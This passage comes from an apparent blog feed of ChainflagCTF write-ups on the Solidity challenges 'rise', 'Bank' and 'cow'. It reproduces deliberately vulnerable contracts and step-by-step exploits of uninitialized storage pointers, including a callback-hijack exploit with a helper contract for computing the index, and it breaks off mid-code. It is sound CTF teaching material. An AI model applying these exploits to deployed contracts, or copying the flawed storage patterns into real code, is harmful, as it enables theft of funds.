BlockchainUtils.GetSpecialAddressByCreate2_two(&#x27;xxxxxx&#x27;,&#x27;xxxxxxx&#x27;,&#x27;ff&#x27;,&#x27;61&#x27;,0,38)</span></span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13.storage @rise</title>
      <link href="/2023/07/13/02.ChainflagCTF/13.storage%20@rise/"/>
      <url>/2023/07/13/02.ChainflagCTF/13.storage%20@rise/</url>
      
        <content type="html"><![CDATA[<h1 id="storage-rise"><a href="#storage-rise" class="headerlink" title="storage(rise)"></a>storage(rise)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.2;</span><br><span class="line">contract rise &#123;</span><br><span class="line">    address referee;</span><br><span class="line">    uint secret;</span><br><span class="line">    uint bl;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    struct hacker &#123; </span><br><span class="line">        address hackeraddress;</span><br><span class="line">        uint value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        referee = msg.sender;</span><br><span class="line">        balance[msg.sender]=10000000;</span><br><span class="line">        bl=1;</span><br><span class="line">        secret=18487187377722;</span><br><span class="line">    &#125;</span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyRefer()&#123;</span><br><span class="line">        require(msg.sender == referee);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;1000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        bl=1;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function airdrop() public</span><br><span class="line">    &#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]==1;</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balance[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function set_secret(uint target_secret) public onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        secret=target_secret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function set_bl(uint target_bl) public onlyRefer</span><br><span class="line">    &#123;</span><br><span class="line">        bl=target_bl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function risegame(uint guessnumber) public payable</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;0);</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (guessnumber==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balance[msg.sender]+=geteth*bl;</span><br><span class="line">            bl=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            balance[msg.sender]=0;</span><br><span class="line">            bl=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transferto(address to) public</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;0);</span><br><span class="line">        if (to !=0)</span><br><span class="line">        &#123;</span><br><span class="line">            balance[to]=balance[msg.sender];</span><br><span class="line">            balance[msg.sender]=0;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            hacker storage h;</span><br><span class="line">            h.hackeraddress=msg.sender;</span><br><span class="line">            h.value=balance[msg.sender];</span><br><span class="line">            balance[msg.sender]=0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>Uninitialized <code>struct</code> pointer</p><ol><li>call <code>airdrop()</code></li><li>call <code>transferto(0x0000000000000000000000000000000000000000)</code> </li><li>call <code>set_bl(9999999999999999999)</code></li><li>call <code>deposit()</code> with 1 ether</li><li>call <code>risegame(1)</code> with 1 ether</li><li>call <code>payforflat(&quot;successfully&quot;)</code></li></ol><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.storage @bank</title>
      <link href="/2023/07/13/02.ChainflagCTF/12.storage%20@bank/"/>
      <url>/2023/07/13/02.ChainflagCTF/12.storage%20@bank/</url>
      
        <content type="html"><![CDATA[<h1 id="storage-bank"><a href="#storage-bank" class="headerlink" title="storage(bank)"></a>storage(bank)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    event SendEther(address addr);</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    </span><br><span class="line">    address public owner;</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    struct SafeBox &#123;</span><br><span class="line">        bool done;</span><br><span class="line">        function(uint, bytes12) internal callback;</span><br><span class="line">        bytes12 hash;</span><br><span class="line">        uint value;</span><br><span class="line">    &#125;</span><br><span class="line">    SafeBox[] safeboxes;</span><br><span class="line">    </span><br><span class="line">    struct FailedAttempt &#123;</span><br><span class="line">        uint idx;</span><br><span class="line">        uint time;</span><br><span class="line">        bytes12 triedPass;</span><br><span class="line">        address origin;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address =&gt; FailedAttempt[]) failedLogs;</span><br><span class="line">    </span><br><span class="line">    modifier onlyPass(uint idx, bytes12 pass) &#123;</span><br><span class="line">        if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123;</span><br><span class="line">            FailedAttempt info;</span><br><span class="line">            info.idx = idx;</span><br><span class="line">            info.time = now;</span><br><span class="line">            info.triedPass = pass;</span><br><span class="line">            info.origin = tx.origin;</span><br><span class="line">            failedLogs[msg.sender].push(info);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit(bytes12 hash) payable public returns(uint) &#123;</span><br><span class="line">        SafeBox box;</span><br><span class="line">        box.done = false;</span><br><span class="line">        box.hash = hash;</span><br><span class="line">        box.value = msg.value;</span><br><span class="line">        if (msg.sender == owner) &#123;</span><br><span class="line">            box.callback = sendFlag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            require(msg.value &gt;= 1 ether);</span><br><span class="line">            box.value -= 0.01 ether;</span><br><span class="line">            box.callback = sendEther;</span><br><span class="line">        &#125;</span><br><span class="line">        safeboxes.push(box);</span><br><span class="line">        return safeboxes.length-1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint idx, bytes12 pass) public payable &#123;</span><br><span class="line">        SafeBox box = safeboxes[idx];</span><br><span class="line">        require(!box.done);</span><br><span class="line">        box.callback(idx, pass);</span><br><span class="line">        box.done = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;</span><br><span class="line">        msg.sender.transfer(safeboxes[idx].value);</span><br><span class="line">        emit SendEther(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;</span><br><span class="line">        require(msg.value &gt;= 100000000 ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>In this challenge, our goal is to emit the <code>SendFlag</code> event. The uninitialized storage pointer <code>info</code> at line 32 allows us to overwrite the length of <code>safeboxes</code> to a large value, making <code>safeboxes</code> overlap with <code>failedLogs</code>. Thus, we can control the <code>callback</code> variable by <code>triedPass</code> in a <code>FailedAttempt</code>, and hijack the program flow to jump directly to the instruction where the <code>SendFlag</code> event is emitted.</p><p>Following the game contract’s logic, we may notice that <code>SendFlag</code> can be emitted only from the callback function <code>sendFlag()</code>, which happens if the safebox is deposited by the <code>owner</code>, the contract creator. However, the owner will not interact with the game contract after it was deployed, so we must exploit some vulnerabilities in the game contract to reach our goal.</p><p>To solve this level, we should know: If we execute an anonymous function in a struct, it will jump based on the content in the anonymous function. For instance: box.callback(id,pass) will jump to the positon that storage in EVM.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct SafeBox &#123;</span><br><span class="line">        bool done;</span><br><span class="line">        function(uint, bytes12) internal callback;</span><br><span class="line">        bytes12 hash;</span><br><span class="line">        uint value;</span><br><span class="line">    &#125;</span><br><span class="line">.....</span><br><span class="line">SafeBox box;</span><br><span class="line">box.callback(idx, pass);</span><br></pre></td></tr></table></figure><h3 id="Finding-the-Bug"><a href="#Finding-the-Bug" class="headerlink" title="Finding the Bug"></a>Finding the Bug</h3><p>After compiling the game contract in <a href="https://remix.ethereum.org/">Remix</a> (or other IDEs), several warnings popped out:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">browser/Bank.sol:32:13: Warning: Uninitialized storage pointer. Did you mean ‘&lt;type&gt; memory info’?</span><br><span class="line">FailedAttempt info;</span><br><span class="line">^—————-^</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">browser/Bank.sol:45:9: Warning: Uninitialized storage pointer. Did you mean ‘&lt;type&gt; memory box’?</span><br><span class="line">SafeBox box;</span><br><span class="line">^———^</span><br></pre></td></tr></table></figure><p>That is, <code>info</code> at line 32 and <code>box</code> at line 45 are <strong>uninitialized storage pointers</strong>. In Solidity &lt; v0.5.0, the default data location for variables of structs and arrays is <code>storage</code> (<a href="https://solidity.readthedocs.io/en/v0.4.24/types.html#data-location">Ref</a>). If these variables are not declared with an initial value, they point to slot 0 in the storage by default, causing that data in slot 0 (or the next few slots) is overwritten when writing to these variables (or to the members of them).</p><h3 id="Exploiting-the-Uninitialized-Storage-Pointers"><a href="#Exploiting-the-Uninitialized-Storage-Pointers" class="headerlink" title="Exploiting the Uninitialized Storage Pointers"></a>Exploiting the Uninitialized Storage Pointers</h3><p>Back to the game contract. When the contract is created, the variables stored at slot 0 to 3 are as follow:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|     unused (12)     |          owner (20)         | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                 randomNumber (32)                 | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|               safeboxes.length (32)               | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|       occupied by failedLogs but unused (32)      | &lt;- slot 3</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure><p>According to the structure of <code>FailedAttempt</code>, its layout in the storage is:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                      idx (32)                     |</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                     time (32)                     |</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|          origin (20)         |   triedPass (12)   |</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure><p>At line 33 to 36, since <code>info</code> is uninitialized and points to slot 0, modifying the members of <code>info</code> leads to overwriting the values at slot 0 to 2. Similarly, the layout <code>SafeBox</code> is,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | hash (12) | callback (8) | done (1) |</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                     value (32)                    |</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure><p>and, in the function <code>deposit()</code>, slot 0 and 1 is overwritten by the members of <code>box</code>.</p><p>Notice that modifying slots 0 and 1, where the value of <code>owner</code> and <code>randomNumber</code> is stored respectively, is useless. Since even if we overwrite <code>owner</code> to our address, we should pass the check at line 74. However, if <code>tx.origin</code> is large enough, modifying the length of <code>safeboxes</code> can make it overlap with <code>failedLogs</code>. This happens with a probability of 1/2, depending on the value of <code>tx.origin</code>.</p><h3 id="Controlling-the-Flow"><a href="#Controlling-the-Flow" class="headerlink" title="Controlling the Flow"></a>Controlling the Flow</h3><p>Now, assume that <code>safeboxes</code> overlaps with <code>failedLogs</code>, and the <code>callback</code> of a <code>Safebox</code> element overlaps with the <code>triedPass</code> of a <code>FailedAttempt</code> element. Since <code>triedPass</code> is completely controlled by us, we can overwrite <code>callback</code> and further control the program flow (at line 64) by calling <code>withdraw()</code> with the corresponding index of the overlapped safebox element.</p><p>Calling internal functions in a contract is identical to executing a <code>JUMP</code> operation. Notice that EVM only allows us to jump to a <code>JUMPDEST</code> instruction. By inspecting the assembly code of the game contract, we can notice that jumping to the instruction <code>0x70f</code> is exactly what we want. After the jump, the program continues to execute at line 75, emits the <code>SendFlag</code> event, and stops after executing the selfdestruct instruction.</p><p>So, this is our full exploit:</p><ol><li>Calculate <code>target = keccak256(keccak256(msg.sender||3)) + 2</code>.</li><li>Calculate <code>base = keccak256(2)</code>.</li><li>Calculate <code>idx = (target - base) // 2</code>.</li><li>If <code>(target - base) % 2 == 1</code>, then <code>idx += 2</code>, and do step 7 twice. This happens when the <code>triedPass</code> of the first element of <code>failedLogs</code> does not overlap with the <code>callback</code> variable, so we choose the second element instead. For ease of problem-solving, we only consider that <code>(target - base) % 2 == 0</code>.</li><li>If <code>(msg.sender &lt;&lt; (12*8)) &lt; idx</code>, then choose another player account, and restart from step 1. This happens when the overwritten length of <code>safeboxes</code> is not large enough to overlap with <code>failedLogs</code>.(the safeboxes’ length should greater than idx, or it doesn’t overlap the failedLogs)</li><li>Call <code>deposit(0x000000000000000000000000)</code> with 1 ether.</li><li>Call <code>withdraw(0, triedPass)</code>.</li><li>Call <code>withdraw(idx, any)</code>, and the <code>SendFlag</code> event will be emitted.</li></ol><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>1.put the contract into remix and get bytecode. Attention! the bytecode remix providing is consist of initcode and runtimecode, we only need runtimecode. So we should delete the content from the first 6080 to the second 6080. Because only the runtimecode will be deployed in EVM.</p><p><img src="https://moe.photo/images/2023/06/23/image-20230623192133733.png" alt></p><p><img src="https://moe.photo/images/2023/06/23/image-20230623200359026.png" alt></p><p>2.decomplie the runtimecode</p><p><img src="https://moe.photo/images/2023/06/23/image-20230623192649582.png" alt></p><p>3.Call <code>deposit(0x000000000000000000000000)</code> with 1 ether.</p><p>4.Call <code>withdraw(0,0x111111000000000000075200)</code>.</p><p><img src="https://moe.photo/images/2023/06/23/image-20230623193133860.png" alt></p><p>5.calculate the idx: I use this EOA: 0xa8008e8a697d416EFDC227169ABE86fd579E197e in Ganache</p><ul><li>target(0xa8008e8a697d416EFDC227169ABE86fd579E197e) = 0x87514589ce108cb2546817ef911709e5cba72d30b256cec09501ab6641ed19aa</li><li>base = 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace</li><li>ZeroIsPerfect(0xa8008e8a697d416EFDC227169ABE86fd579E197e) = 0</li><li>idx(0xa8008e8a697d416EFDC227169ABE86fd579E197e) = 16051576312513365899836508591052638300203044566877098313835095392794399268719</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract cal&#123;</span><br><span class="line">    function target(address _addr)public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(keccak256(abi.encodePacked(bytes32(_addr),bytes32(3))));</span><br><span class="line">    &#125;</span><br><span class="line">    function base() public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(bytes32(2));</span><br><span class="line">    &#125;</span><br><span class="line">    function idx(address _addr) public pure returns(uint256 idx)&#123;</span><br><span class="line">        return (uint256(target(_addr)) + 2 - uint256(base())) / 2;</span><br><span class="line">    &#125;</span><br><span class="line">    function ZeroIsPerfect(address _addr) public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(target(_addr)) + 2 - uint256(base())) % 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And the safeboxes’ length is greater than idx</p><p>6.Call <code>withdraw(idx, any)</code>, and the <code>SendFlag</code> event will be emitted.</p><p><img src="https://moe.photo/images/2023/06/23/image-20230623192919503.png" alt></p><p>the EVM<br><img src="https://moe.photo/images/2023/06/23/ffff.png" alt></p><h2 id="repair"><a href="#repair" class="headerlink" title="repair"></a>repair</h2><p>To fix the bugs in the game contract, the data location of <code>info</code> and <code>box</code> should be explicitly declared as <code>memory</code>. Starting from Solidity v5.0.0, explicit data location for all variables of the struct, array or mapping types is mandatory (<a href="https://solidity.readthedocs.io/en/v0.5.0/050-breaking-changes.html#explicitness-requirements">Ref</a>).</p>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.storage @cow</title>
      <link href="/2023/07/13/02.ChainflagCTF/11.storage%20@cow/"/>
      <url>/2023/07/13/02.ChainflagCTF/11.storage%20@cow/</url>
      
        <content type="html"><![CDATA[<h1 id="storage-cow"><a href="#storage-cow" class="headerlink" title="storage(cow)"></a>storage(cow)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.2;</span><br><span class="line">contract cow&#123;</span><br><span class="line">    address public owner_1;</span><br><span class="line">    address public owner_2;</span><br><span class="line">    address public owner_3;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line"></span><br><span class="line">    struct hacker &#123;</span><br><span class="line">        address hackeraddress1;</span><br><span class="line">        address hackeraddress2;</span><br><span class="line">    &#125;</span><br><span class="line">    hacker  h;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        owner_1 = msg.sender;</span><br><span class="line">        owner_2 = msg.sender;</span><br><span class="line">        owner_3 = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function payforflag(string b64email) public</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner_1);</span><br><span class="line">        require(msg.sender==owner_2);</span><br><span class="line">        require(msg.sender==owner_3);</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Cow() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (geteth==1)</span><br><span class="line">        &#123;</span><br><span class="line">            owner_1=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cov() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (geteth&lt;1)</span><br><span class="line">        &#123;</span><br><span class="line">            hacker fff=h;</span><br><span class="line">            fff.hackeraddress1=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            fff.hackeraddress2=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function see() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balance[msg.sender]+=geteth;</span><br><span class="line">        if (uint(msg.sender) &amp; 0xffff == 0x525b)</span><br><span class="line">        &#123;</span><br><span class="line">            balance[msg.sender] -= 0xb1b1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy_own() public</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;1000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner_3=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>solution 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.20;</span><br><span class="line">// CREATE2 was added to Inline assembler in version 0.5.2</span><br><span class="line"></span><br><span class="line">interface Icow&#123;</span><br><span class="line">    function Cow()external 